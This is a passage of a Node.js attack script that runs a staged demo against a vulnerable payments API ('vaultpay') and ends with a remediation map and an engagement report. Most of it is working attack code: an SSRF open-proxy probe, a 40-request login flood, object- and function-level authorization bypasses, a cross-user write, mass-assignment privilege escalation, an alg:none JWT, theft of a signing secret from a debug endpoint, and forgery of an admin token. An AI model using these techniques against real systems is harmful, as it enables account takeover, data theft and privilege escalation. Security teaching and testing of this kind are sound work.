        narrate(`Fallback: open-proxy fetch of ${external}…`);
        const ext = await http("GET", `/api/proxy?url=${encodeURIComponent(external)}`, {
            timeoutMs: 12_000,
            label: "ssrf-external",
        });
        if (ext.status === 200 && /example|domain|illustrative/i.test(ext.text)) {
            bad("Server-side open proxy fetched an arbitrary external URL");
            loot("proxy-snippet", ext.text.replace(/\s+/g, " ").trim().slice(0, 120));
            record(
                "HIGH",
                "Open proxy: server fetches arbitrary URLs (SSRF surface)",
                "Self-target blocked by CF 1042; external target succeeded — open proxy, not a framework feature",
                { kind: "app-code", owasp: "API7", probe: "ssrf" }
            );
        } else {
            info(`External proxy probe → ${ext.status} (self still CF-blocked)`);
        }
    } else if (res.status === 404 && /not found/i.test(res.text || "")) {
        ok("Open proxy route disabled (404)");
        proxyAlive = false;
    } else {
        info(`Self-proxy probe → ${res.status}`);
        const external = "https://example.com/";
        narrate(`Fallback: open-proxy fetch of ${external}…`);
        const ext = await http("GET", `/api/proxy?url=${encodeURIComponent(external)}`, {
            timeoutMs: 12_000,
            label: "ssrf-external",
        });
        if (ext.status === 200 && ext.text.length > 20) {
            bad("Server-side open proxy fetched an arbitrary external URL");
            record(
                "HIGH",
                "Open proxy: server fetches arbitrary URLs (SSRF surface)",
                "App /api/proxy with no allowlist",
                { kind: "app-code", owasp: "API7", probe: "ssrf" }
            );
        } else if (ext.status === 404) {
            proxyAlive = false;
            ok("Open proxy route disabled (404)");
        } else {
            info(`External proxy probe → ${ext.status}`);
        }
    }

    await probeInternalPivot({ proxyAlive });
}

/**
 * PHASE 06 · Login flood — observed authentication throttling
 */
async function phaseNoRateLimitFlood() {
    step("Login flood — observed authentication throttling");
    intent(
        "Does anything slow down password guessing? One bounded batch of wrong passwords on one account."
    );
    if (skipFlood) {
        info("Skipped (--skip-flood)");
        return;
    }
    const N = 40;
    const idBefore = reqSeq;
    narrate(`Firing ${N} parallel POST /api/auth/login with wrong passwords…`);
    const t0 = Date.now();
    const results = await Promise.all(
        Array.from({ length: N }, (_, i) =>
            http("POST", "/api/auth/login", {
                body: { email: "alice@example.com", password: "wrong-password" },
                timeoutMs: 20_000,
                silent: true,
                label: `flood-${i}`,
            }).catch((e) => ({ status: 0, error: e.message, ms: 0 }))
        )
    );
    const ms = Date.now() - t0;
    const statuses = results.map((r) => r.status);
    const counted = statuses.reduce((m, s) => {
        m[s] = (m[s] || 0) + 1;
        return m;
    }, {});
    const got429 = statuses.filter((s) => s === 429).length;
    const got401 = results.filter((result) => result.status === 401 && result.json?.error === "Incorrect password").length;
    const idAfter = reqSeq;

    console.log(
        `  ${c.cyan}${c.bold}→ SEND${c.reset}  ${c.bold}#${idBefore + 1}–#${idAfter}${c.reset}  ${N}× parallel POST /api/auth/login  ${c.dim}(wire logs collapsed)${c.reset}`
    );
    console.log(
        `  ${c.green}${c.bold}← RECV${c.reset}  flood batch  finished in ${c.bold}${ms}ms${c.reset}  histogram=${JSON.stringify(counted)}`
    );

    const advertisedLimit = results
        .map((r) => r.headers?.["x-ratelimit-limit"] || r.headers?.["ratelimit-limit"])
        .find(Boolean);

    if (got429 === 0 && got401 >= N * 0.7 && advertisedLimit) {
        bad(`${got401}/${N} attempts returned the normal wrong-password error; zero 429 responses`);
        reduced(
            "flood",
            `A general rate limit is advertised (${advertisedLimit} requests per window) — it caps volume, it is not a login throttle`
        );
        record(
            "MEDIUM",
            "No login-specific throttling; general rate limit only",
            `${got401}/${N} wrong passwords accepted, zero 429. Response headers advertise a general limit of ${advertisedLimit} per window, which slows guessing but does not stop it.`,
            { kind: "app-code", owasp: "API2", cwe: "CWE-307", probe: "flood" }
        );
    } else if (got429 === 0 && got401 >= N * 0.7) {
        bad(`${got401}/${N} attempts returned the normal wrong-password error; zero 429 responses`);
        record(
            "HIGH",
            "No authentication throttling observed in this batch",
            `${got401}/${N} concurrent attempts returned Incorrect password, zero 429. Does not prove absence of all lockouts, delays, or longer-window limits. Resource-abuse risks also relate to API4.`,
            { kind: "framework-gap", owasp: "API2", cwe: "CWE-307", probe: "flood" }
        );
    } else if (got429 > 0) {
        blocked("flood", `Throttled: ${got429}/${N} attempts answered 429 Too Many Requests`);
    } else {
        info(`Authentication throttle probe inconclusive: ${JSON.stringify(counted)}`);
    }
}

const DEMO_CREDENTIALS = [
    { email: "alice@example.com", password: "password123" },
    { email: "bob@example.com", password: "bobsecret" },
    { email: "admin@vaultpay.demo", password: "admin123" },
];

async function demoLogin() {
    let throttled = false;
    for (const cred of DEMO_CREDENTIALS) {
        narrate(`Trying demo login ${cred.email}…`);
        const res = await http("POST", "/api/auth/login", {
            body: cred,
            label: `login:${cred.email}`,
        });
        if (res.status === 200 && res.json?.token) {
            return { ...cred, token: res.json.token, user: res.json.user };
        }
        if (res.status === 429) throttled = true;
    }
    return throttled ? { throttled: true } : null;
}

/**
 * Authn ≠ authz — login, BOLA, admin route, cross-user write, mass assignment
 * (first half of attack.mjs phase 16)
 */
async function phaseAuthz() {
    step("Authn ≠ authz — one ordinary login, then everything");
    intent("JWT proves someone logged in. It does not decide what they may read or write.");

    const loginOk = await demoLogin();
    if (!loginOk || loginOk.throttled) {
        if (loginOk?.throttled) {
            ok("Login answered 429 — this client is locked out, so no session to test with");
            info("Authorization probes were not reached in this run. Restart the target (or wait for the lockout window) and re-run.");
        } else {
            bad("Could not login with demo credentials — skipping authz chain");
        }
        return;
    }
    stolen.token = loginOk.token;
    stolen.loginUser = loginOk.user;
    ok(`Logged in as ${loginOk.email} (role=${loginOk.user.role})`);
    loot("token", loginOk.token);
    const isAdminLogin = loginOk.user.role === "admin";
    const auth = { Authorization: `Bearer ${stolen.token}` };

    narrate("Fetching /api/orders with this user JWT — server should scope to self…");
    const orders = await http("GET", "/api/orders", { headers: auth, label: "bola-orders" });
    if (orders.status === 200 && Array.isArray(orders.json?.orders)) {
        stolen.orders = orders.json.orders;
        const others = new Set(
            stolen.orders.map((o) => o.userId).filter((id) => id !== loginOk.user.id)
        );
        if (others.size > 0 && !isAdminLogin) {
            bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users — BOLA (Broken Object Level Authorization)`);
            for (const o of stolen.orders.slice(0, 8)) {
                loot(`Order #${o.id}`, `userId=${o.userId} ${o.merchant} $${o.amount} ····${o.cardLast4}`);
            }
            record(
                "CRITICAL",
                "BOLA on /api/orders",
                "Authn present, authz missing — any login reads every order",
                { kind: "app-code", owasp: "API1", probe: "bola" }
            );
        } else if (isAdminLogin) {
            info("Admin fallback cannot establish unauthorized cross-user order access; no BOLA finding counted");
        } else {
            blocked("bola", `Orders scoped to self (${stolen.orders.length} order(s) for user #${loginOk.user.id})`);
        }
    } else {
        blocked("bola", `GET /api/orders → ${orders.status}${refusalReason(orders)}`);
    }

    const escId = loginOk.user.id;

    if (!isAdminLogin) {
        narrate("Hit /api/admin/stats before escalation with a non-admin identity...");
        const stats = await http("GET", "/api/admin/stats", { headers: auth, label: "admin-stats" });
        const accounts = Array.isArray(stats.json?.accounts) ? stats.json.accounts : [];
        if (stats.status === 200 && accounts.length > 0) {
            const leaksSecrets = sensitiveFieldsIn(accounts).length > 0;
            bad(`Admin dashboard open to a non-admin — BFLA (Broken Function Level Authorization) — ${accounts.length} accounts`);
            for (const account of accounts.slice(0, 6)) {
                loot(
                    account.email,
                    leaksSecrets
                        ? `password=${account.password} ssn=${account.ssn}`
                        : `role=${account.role} balance=${account.balance}`
                );
            }
            if (!leaksSecrets) reduced("admin", "No passwords or SSNs in the admin response");
            record(
                leaksSecrets ? "CRITICAL" : "HIGH",
                "Admin route accessible to a non-admin identity",
                leaksSecrets
                    ? "Observed before role mutation: a regular user's token accesses the administrative account dump (BFLA)."
                    : "Observed before role mutation: a regular user's token reaches the admin route (BFLA); the response carries public profile fields only.",
                { kind: "app-code", owasp: "API5", probe: "admin" }
            );
        } else if (stats.status === 401 || stats.status === 403) {
            blocked("admin", `Admin route refused a non-admin token (${stats.status}${refusalReason(stats)})`);
        } else {
            info(`Non-admin access probe returned ${stats.status}; BFLA not confirmed`);
        }
    } else {
        info("Login fallback is already admin; skip non-admin BFLA and privilege-escalation claims");
    }

    const victimId = escId === 2 ? 1 : 2;
    const victimName = victimId === 2 ? "Bob" : "Alice";
    narrate(`Cross-user write: ${loginOk.email}'s token edits seed user #${victimId} (${victimName})…`);
    let hijack = await http("PUT", `/api/users/${victimId}`, {
        headers: auth,
        body: {
            internalNote: "cleared by attacker via cross-user PUT",
            name: `Hijacked ${victimName}`,
        },
        label: "cross-user-write",
    });
    if (hijack.status === 400 || hijack.status === 422) {
        info(`Server rejected the internalNote field (${hijack.status}${refusalReason(hijack)})`);
        narrate("Retrying with only a field the profile form is allowed to send (name)…");
        hijack = await http("PUT", `/api/users/${victimId}`, {
            headers: auth,
            body: { name: `Hijacked ${victimName}` },
            label: "cross-user-write-name",
        });
    }
    if (!isAdminLogin && hijack.status === 200 &&
        hijack.json?.user?.id === victimId && hijack.json.user.name === `Hijacked ${victimName}`) {
        bad(`Rewrote user #${victimId} without ownership check`);
        loot("victim", JSON.stringify(hijack.json.user));
        record(
            "CRITICAL",
            "Cross-user write without ownership check",
            "Before escalation, a regular user's token edited a different seed user's record without an ownership check.",
            { kind: "app-code", owasp: "API1", probe: "cross-write" }
        );
    } else if ([401, 403, 404].includes(hijack.status)) {
        blocked("cross-write", `Cross-user write refused (${hijack.status}${refusalReason(hijack)})`);
    } else {
        info(`Cross-user write → ${hijack.status}`);
    }

    narrate(`Mass-assign role=admin and balance on seed user #${escId} (${loginOk.email})...`);
    const escalate = await http("PUT", `/api/users/${escId}`, {
        headers: auth,
        body: { role: "admin", balance: 1_000_000, internalNote: "pwned by attack.mjs" },
        label: "mass-assign-admin",
    });
    if (!isAdminLogin && escalate.status === 200 && escalate.json?.user?.id === escId &&
        escalate.json.user.role === "admin" && escalate.json.user.balance === 1_000_000) {
        stolen.escalated = true;
        bad(`User #${escId} has role=admin and balance=${escalate.json.user.balance}`);
        loot("new-role", escalate.json.user.role);
        loot("new-balance", String(escalate.json.user.balance));
        record(
            "CRITICAL",
            "Mass assignment privilege escalation",
            "No field allowlist on PUT body - app merged raw JSON into the user",
            { kind: "app-code", owasp: "API3", probe: "mass-assign" }
        );
    } else if (!isAdminLogin && [400, 401, 403, 422].includes(escalate.status)) {
        blocked("mass-assign", `role / balance write refused (${escalate.status}${refusalReason(escalate)})`);
        const me = await http("GET", "/api/me", { headers: auth, label: "confirm-role" });
        if (me.json?.user) info(`Confirmed: still role=${me.json.user.role}, balance=${me.json.user.balance}`);
    } else if (!isAdminLogin && escalate.status === 200) {
        const after = escalate.json?.user || {};
        blocked("mass-assign", `Write accepted but role=${after.role}, balance=${after.balance} — privileged fields were ignored`);
    } else {
        info(`Mass assignment → ${escalate.status}`);
    }
}

/**
 * Forged admin JWT (climax) — second half of attack.mjs phase 16. Needs no login.
 */
async function phaseForgery() {
    step("Forge an admin JWT with the stolen secret");
    intent("The signature only proves who holds the key. Do we hold the key?");

    narrate('Trying the classic "alg": "none" unsigned-token forgery…');
    const noneToken = `${b64url(JSON.stringify({ alg: "none", typ: "JWT" }))}.${b64url(
        JSON.stringify({ sub: 3, email: "admin@vaultpay.demo", role: "admin", name: "None Admin" })
    )}.`;
    const noneRes = await http("GET", "/api/me", {
        headers: { Authorization: `Bearer ${noneToken}` },
        label: "jwt-alg-none",
    });
    if (noneRes.status === 200 && noneRes.json?.user?.id === 3) {
        bad("Server accepted an UNSIGNED alg:none token");
        record(
            "CRITICAL",
            "Unsigned JWT (alg:none) accepted",
            "Verification did not pin an algorithm allowlist",
            { kind: "app-code", owasp: "API2" }
        );
    } else if (
        noneRes.status === 403 &&
        (noneRes.headers["x-vercel-mitigated"] || noneRes.headers["cf-mitigated"] || !noneRes.json)
    ) {
        // A host firewall answered, not the app (e.g. Vercel: `x-vercel-mitigated: deny`).
        notePlatform(
            `alg:none request denied at the edge (403${noneRes.headers["x-vercel-mitigated"] ? ", x-vercel-mitigated: " + noneRes.headers["x-vercel-mitigated"] : ""}) — the app never saw it`,
            "This is the host's firewall, not JWT verification. The app's own answer to an unsigned token is untested on this host."
        );
    } else if (noneRes.status === 401 || noneRes.status === 403) {
        if (isExpressTarget()) {
            ok(`alg:none rejected (${noneRes.status}) — jsonwebtoken v9 pins HS256/384/512 for string secrets, not the app`);
            info("You did not configure this. A library maintainer did.");
        } else {
            ok(`alg:none rejected (${noneRes.status}) — an unsigned token is not accepted`);
        }
    } else {
        info(`Unsigned-token probe inconclusive (${noneRes.status}); signature rejection not confirmed`);
    }

    if (!stolen.jwtSecret) {
        narrate("No signing secret yet — is there a leftover debug endpoint?");
        const dbg = await http("GET", "/api/debug/config", { label: "debug-leak" });
        if (dbg.status === 200 && dbg.json?.jwtSecret) {
            stolen.jwtSecret = dbg.json.jwtSecret;
            bad("Debug config is public — and it prints the signing secret");
            loot("JWT_SECRET", stolen.jwtSecret);
            record(
                "CRITICAL",
                "Debug endpoint leaks JWT signing secret",
                "App left /api/debug/config public — forge any identity next",
                { kind: "app-code", owasp: "API8" }
            );
        } else {
            info(`/api/debug/config → ${dbg.status}`);
        }
    }

    if (!stolen.jwtSecret) {
        blocked("forge", "No signing secret recovered by any route — nothing to forge with");
        return;
    }

    // A real attacker copies the issuer / audience claims from their own valid token.
    const copied = {};
    try {
        const own = JSON.parse(Buffer.from(String(stolen.token).split(".")[1], "base64url").toString("utf8"));
        for (const k of ["aud", "iss"]) if (own[k] !== undefined) copied[k] = own[k];
    } catch {
        /* no session token to copy from */
    }
    if (Object.keys(copied).length) {
        narrate(`Copying ${Object.keys(copied).join(" + ")} from our own valid token so the forgery matches…`);
    }

    narrate(`Forging HS256 admin JWT with leaked secret "${stolen.jwtSecret}"…`);
    const admin =
        stolen.users.find((u) => u.role === "admin") || {
            id: 3,
            email: "admin@vaultpay.demo",
        };
    const forged = signHs256(
        {
            sub: admin.id,
            email: admin.email,
            role: "admin",
            name: "Forged Admin",
            ...copied,
            iat: Math.floor(Date.now() / 1000),
            exp: Math.floor(Date.now() / 1000) + 86400,
        },
        stolen.jwtSecret
    );
    loot("forged-jwt", forged);
    const me = await http("GET", "/api/me", {
        headers: { Authorization: `Bearer ${forged}` },
        label: "forged-admin-me",
    });
    if (me.status === 200 && me.json?.user?.id === admin.id && me.json.user.role === "admin") {
        stolen.forgedAdminToken = forged;
        bad("Server accepted a fully attacker-forged admin JWT");
        loot("forged-identity", JSON.stringify(me.json?.user));
        record(
            "CRITICAL",
            "Forged JWTs accepted (weak/leaked secret)",
            "A forged token returned the intended admin identity. Signature verification is expected to accept correctly signed tokens; disclosure/weakness of the key is the authentication compromise.",
            { kind: "app-code", owasp: "API2", probe: "forge" }
        );
    } else if (me.status === 401 || me.status === 403) {
        blocked("forge", `Forged admin token rejected (${me.status}${refusalReason(me)})`);
    } else {
        info(`Forged admin identity not confirmed (${me.status}); generated token is not counted as accepted`);
    }
}

function printRemediation() {
    console.log(`
${c.bold}${c.green}╔══════════════════════════════════════════════════════════════════════╗
║                     REMEDIATION (quick fix map)                      ║
╚══════════════════════════════════════════════════════════════════════╝${c.reset}
`);
    console.log(`  ${c.red}${c.bold}(app-code)${c.reset}  — fix in your handlers (framework will not invent these)
    · Ownership (BOLA/IDOR): order.userId === req.user.sub — on every read AND write
    · Roles (BFLA): requireRole("admin") — login alone is not enough
    · Request field allowlist — never merge raw JSON into user/role
    · Response field allowlist — pick what you return; no ssn/cardNumber leaving endpoints
    · Path jail on any file path from user input
    · SSRF: allowlist egress hosts; reject link-local/metadata (169.254.169.254)
    · Authn ≠ authz: a valid JWT is not an access-control policy\n`);

    if (stolen.findings.some((f) => f.kind === "framework-gap")) {
        console.log(`  ${c.blue}${c.bold}(framework-gap)${c.reset} — this stack does not ship these; you must add them
    · Rate limit / login throttle (e.g. express-rate-limit)\n`);
    }
}

function printReport() {
    const bySev = stolen.findings.reduce((m, f) => {
        m[f.severity] = (m[f.severity] || 0) + 1;
        return m;
    }, {});
    const byKind = stolen.findings.reduce((m, f) => {
        const k = f.kind || "app-code";
        m[k] = (m[k] || 0) + 1;
        return m;
    }, {});
    const criticals = bySev.CRITICAL || 0;
    const owaspHits = [
        ...new Set(stolen.findings.map((f) => f.owasp).filter(Boolean)),
    ].sort();

    console.log(`
${c.bold}${c.red}╔══════════════════════════════════════════════════════════════════════╗
║                        ENGAGEMENT REPORT                             ║
╚══════════════════════════════════════════════════════════════════════╝${c.reset}
`);
    const elapsedSec = ((Date.now() - startedAt) / 1000).toFixed(1);
    console.log(`  ${c.bold}Target${c.reset}          ${BASE}`);
    if (targetLabel) console.log(`  ${c.bold}Stack${c.reset}           ${targetLabel}`);
    console.log(`  ${c.bold}HTTP requests${c.reset}   ${reqSeq}`);
    console.log(`  ${c.bold}Elapsed${c.reset}         ${elapsedSec}s`);
    console.log(`  ${c.bold}Finding records${c.reset} ${stolen.findings.length}`);
    console.log(`  ${c.bold}By severity${c.reset}     ${JSON.stringify(bySev)}`);
    console.log(`  ${c.bold}By kind${c.reset}         ${JSON.stringify(byKind)}`);
    console.log(
        `  ${c.bold}OWASP API 2023${c.reset}   ${owaspHits.length ? owaspHits.join(", ") : "—"}`
    );
    console.log(`  ${c.bold}Users stolen${c.reset}     ${stolen.users.length}`);
    console.log(`  ${c.bold}Orders stolen${c.reset}    ${stolen.orders.length}`);
    console.log(
        `  ${c.bold}JWT secret${c.reset}       ${stolen.jwtSecret ? c.red + "YES — " + stolen.jwtSecret + c.reset : "no"}`
    );
    console.log(`  ${c.bold}Privilege esc${c.reset}    ${stolen.escalated ? c.red + "YES" + c.reset : "no"}`);
    console.log(
        `  ${c.bold}Forged admin${c.reset}     ${stolen.forgedAdminToken ? c.red + "YES" + c.reset : "no"}`
    );

    console.log(`\n  ${c.bold}All findings:${c.reset}`);
    for (const f of stolen.findings) {
        finding(f.severity, f.title, f);
        if (f.detail && !projector) info(f.detail);
    }

    if (stolen.reduced.length) {
        console.log(`\n  ${c.bold}${c.yellow}Reduced (hole still open, less to steal):${c.reset}`);
        for (const m of stolen.reduced) console.log(`    ${c.yellow}◐${c.reset} ${m}`);
    }
    if (stolen.blocked.length) {
        console.log(`\n  ${c.bold}${c.green}Blocked (the server refused the probe):${c.reset}`);
        for (const m of stolen.blocked) console.log(`    ${c.green}✓${c.reset} ${m}`);
    }

    if (stolen.platformNotes.length) {
        console.log(`\n  ${c.bold}${c.yellow}Platform notes (edge blocked probe — app may still be open):${c.reset}`);
        for (const n of stolen.platformNotes) {
            console.log(`    ${c.yellow}◇${c.reset} ${n.title}`);
            if (n.detail) info(n.detail);
        }
    }

    const defended =
        stolen.blocked.length + stolen.reduced.length
            ? ` · ${stolen.blocked.length} blocked · ${stolen.reduced.length} reduced`
            : "";
    if (criticals > 0) {
        console.log(
            `\n${c.bgRed}${c.white}${c.bold}  DEMO RESULT: API PWNED — ${criticals} critical findings${defended} · ${reqSeq} requests · ${elapsedSec}s  ${c.reset}\n`
        );
    } else {
        console.log(
            `\n${c.bgGreen}${c.white}${c.bold}  DEMO RESULT: 0 critical${defended} · ${reqSeq} requests · ${elapsedSec}s  ${c.reset}\n`
        );
    }

    printRemediation();

    if (asJson) {
        console.log(
            JSON.stringify(
                {
                    target: BASE,
                    stack: targetLabel || null,
                    owaspEdition: 2023,
                    severityScheme: "demo-author-rated",
                    requests: reqSeq,
                    elapsedSeconds: Number(elapsedSec),
                    findings: stolen.findings,
                    platformNotes: stolen.platformNotes,
                    reduced: stolen.reduced,
                    blocked: stolen.blocked,
                    probes: PROBES.map(([id, title]) => ({
                        id,
                        title,
                        ...(stolen.outcomes[id] || { state: "not-reached", note: "" }),
                    })),
                    usersStolen: stolen.users.length,
                    ordersStolen: stolen.orders.length,
                    jwtSecret: Boolean(stolen.jwtSecret),
                    escalated: stolen.escalated,
                    forgedAdmin: Boolean(stolen.forgedAdminToken),
                },
                null,
                2
            )
        );
    }
}

/**
 * Orchestrator — [Enter] (--drama) between every phase and before the report,
 * so the forged-admin result stays on screen until you release it.
 */
async function main() {
    await identifyTarget();
    banner();
    await phaseReset();
    await dramaPause();
    await phaseUnauthDataTheft();
    await dramaPause();
    await phasePathTraversal();
    await dramaPause();
    await phaseSsrfProxy();
    await dramaPause();
    await phaseAuthz();
    await dramaPause();
    await phaseNoRateLimitFlood();
    await dramaPause();
    await phaseForgery();
    await dramaPause();
    printReport();
}

main().catch((err) => {
    console.error(err);
    process.exit(1);
});
